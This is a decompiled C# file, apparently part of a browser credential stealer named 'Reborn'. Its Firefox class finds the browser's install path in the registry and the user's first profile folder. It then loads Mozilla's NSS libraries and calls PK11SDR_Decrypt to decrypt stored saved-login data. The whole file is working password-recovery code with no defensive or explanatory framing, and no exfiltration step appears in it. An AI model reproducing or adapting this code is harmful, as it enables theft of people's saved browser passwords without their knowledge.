using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;

namespace Reborn.Browsers
{
	// Token: 0x0200002B RID: 43
	public static class Firefox
	{
		// Token: 0x060000FE RID: 254 RVA: 0x00002E6F File Offset: 0x0000106F
		static Firefox()
		{
			if (!Firefox.isFirefoxInstalled)
			{
				return;
			}
			Firefox.firefoxPath = Firefox.GetFirefoxInstallPath().FullName;
			Firefox.firefoxProfilePath = Firefox.GetProfilePath().FullName;
		}

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x060000FF RID: 255 RVA: 0x00002E97 File Offset: 0x00001097
		private static bool isFirefoxInstalled
		{
			get
			{
				return Firefox.GetFirefoxInstallPath() != null;
			}
		}

		// Token: 0x06000100 RID: 256 RVA: 0x00009E28 File Offset: 0x00008028
		public static string Decrypt(string cipherText)
		{
			string result;
			try
			{
				if (Firefox.firefoxPath != null)
				{
					if (Firefox.firefoxProfilePath != null)
					{
						Firefox.InitializeNssLibrary(Firefox.firefoxPath, Firefox.firefoxProfilePath);
						StringBuilder stringBuilder = new StringBuilder(cipherText);
						Console.WriteLine(Firefox.PK11_Autheticate(Firefox.PK11_GetInternalKeySlot(), true, 0));
						TSECItem tSECItem = default(TSECItem);
						TSECItem tSECItem2 = (TSECItem)Marshal.PtrToStructure(new IntPtr(Firefox.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length)), typeof(TSECItem));
						Firefox.PK11SDR_Decrypt(ref tSECItem2, ref tSECItem, 0);
						byte[] array = new byte[tSECItem.SECItemLen];
						Marshal.Copy(new IntPtr(tSECItem.SECItemData), array, 0, tSECItem.SECItemLen);
						result = Encoding.UTF8.GetString(array);
					}
					else
					{
						result = null;
					}
				}
				else
				{
					result = null;
				}
			}
			catch (Exception arg)
			{
				Console.WriteLine("Mozilla : " + arg);
				result = null;
			}
			return result;
		}

		// Token: 0x06000101 RID: 257 RVA: 0x00009F2C File Offset: 0x0000812C
		public static DirectoryInfo GetProfilePath()
		{
			DirectoryInfo result;
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(string.Format("{0}\\Mozilla\\Firefox\\Profiles", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)));
				if (!directoryInfo.Exists)
				{
					result = null;
				}
				else
				{
					DirectoryInfo[] directories = directoryInfo.GetDirectories();
					Firefox.firefoxProfilePath = ((directories.Length == 0) ? null : directories[0].FullName);
					result = ((directories.Length == 0) ? null : directories[0]);
				}
			}
			catch (Exception arg_56_0)
			{
				Console.WriteLine(arg_56_0.ToString());
				result = null;
			}
			return result;
		}

		// Token: 0x06000102 RID: 258 RVA: 0x00009FB0 File Offset: 0x000081B0
		public static DirectoryInfo GetFirefoxInstallPath()
		{
			RegistryKey registryKey = Firefox.InternalCheckIsWow64() ? Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Mozilla\\Mozilla Firefox") : Registry.LocalMachine.OpenSubKey("SOFTWARE\\Mozilla\\Mozilla Firefox");
			string[] subKeyNames = registryKey.GetSubKeyNames();
			if (subKeyNames.Length == 0)
			{
				return null;
			}
			return new DirectoryInfo(Firefox.firefoxPath = registryKey.OpenSubKey(subKeyNames[0]).OpenSubKey("Main").GetValue("Install Directory").ToString());
		}

		// Token: 0x06000103 RID: 259
		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool IsWow64Process([In] IntPtr hProcess, out bool wow64Process);

		// Token: 0x06000104 RID: 260 RVA: 0x0000A024 File Offset: 0x00008224
		public static bool InternalCheckIsWow64()
		{
			if ((Environment.OSVersion.Version.Major != 5 || Environment.OSVersion.Version.Minor < 1) && Environment.OSVersion.Version.Major < 6)
			{
				return false;
			}
			bool result;
			using (Process currentProcess = Process.GetCurrentProcess())
			{
				bool flag;
				result = (Firefox.IsWow64Process(currentProcess.Handle, out flag) & flag);
			}
			return result;
		}

		// Token: 0x06000105 RID: 261 RVA: 0x0000A0AC File Offset: 0x000082AC
		private static void InitializeNssLibrary(string firefoxPath, string firefoxProfilePath)
		{
			Firefox.SetDllDirectory(firefoxPath);
			Firefox.LoadLibrary("nssdbm3.dll");
			Firefox.LoadLibrary("softokn3.dll");
			Firefox.LoadLibrary("mozglue.dll");
			Firefox.LoadLibrary("nssckbi.dll");
			Firefox.nssModule = Firefox.LoadLibrary("nss3.dll");
			Firefox.SetDllDirectory(null);
			Firefox.NSS_Init(firefoxProfilePath);
		}

		// Token: 0x06000106 RID: 262 RVA: 0x00002EA1 File Offset: 0x000010A1
		private static void NSS_Init(string configdir)
		{
			((Firefox.NSS_InitPtr)Marshal.GetDelegateForFunctionPointer(Firefox.GetProcAddress(Firefox.nssModule, "NSS_Init"), typeof(Firefox.NSS_InitPtr)))(configdir);
		}

		// Token: 0x06000107 RID: 263 RVA: 0x00002ECD File Offset: 0x000010CD
		private static long PK11_GetInternalKeySlot()
		{
			return ((Firefox.PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(Firefox.GetProcAddress(Firefox.nssModule, "PK11_GetInternalKeySlot"), typeof(Firefox.PK11_GetInternalKeySlotPtr)))();
		}

		// Token: 0x06000108 RID: 264 RVA: 0x00002EF7 File Offset: 0x000010F7
		private static void PK11SDR_Decrypt(ref TSECItem input, ref TSECItem output, int cx)
		{
			((Firefox.PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer(Firefox.GetProcAddress(Firefox.nssModule, "PK11SDR_Decrypt"), typeof(Firefox.PK11SDR_DecryptPtr)))(ref input, ref output, cx);
		}

		// Token: 0x06000109 RID: 265 RVA: 0x00002F25 File Offset: 0x00001125
		private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
		{
			return ((Firefox.NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer(Firefox.GetProcAddress(Firefox.nssModule, "NSSBase64_DecodeBuffer"), typeof(Firefox.NSSBase64_DecodeBufferPtr)))(arenaOpt, outItemOpt, inStr, inLen);
		}

		// Token: 0x0600010A RID: 266 RVA: 0x00002F53 File Offset: 0x00001153
		private static long PK11_Autheticate(long slot, bool loadCerts, int cx)
		{
			return ((Firefox.PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(Firefox.GetProcAddress(Firefox.nssModule, "PK11_Authenticate"), typeof(Firefox.PK11_AuthenticatePtr)))(slot, loadCerts, cx);
		}

		// Token: 0x0600010B RID: 267
		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool SetDllDirectory(string lpPathName);

		// Token: 0x0600010C RID: 268
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr LoadLibrary(string libPath);

		// Token: 0x0600010D RID: 269
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr module, string procedure);

		// Token: 0x04000079 RID: 121
		private static string firefoxPath;

		// Token: 0x0400007A RID: 122
		private static string firefoxProfilePath;

		// Token: 0x0400007B RID: 123
		private static IntPtr nssModule;

		// Token: 0x0200002C RID: 44
		// (Invoke) Token: 0x0600010F RID: 271
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

		// Token: 0x0200002D RID: 45
		// (Invoke) Token: 0x06000113 RID: 275
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, int cx);

		// Token: 0x0200002E RID: 46
		// (Invoke) Token: 0x06000117 RID: 279
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate int PK11SDR_DecryptPtr(ref TSECItem input, ref TSECItem output, int cx);

		// Token: 0x0200002F RID: 47
		// (Invoke) Token: 0x0600011B RID: 283
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate long PK11_GetInternalKeySlotPtr();

		// Token: 0x02000030 RID: 48
		// (Invoke) Token: 0x0600011F RID: 287
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate IntPtr NSS_InitPtr(string configdir);
	}
}
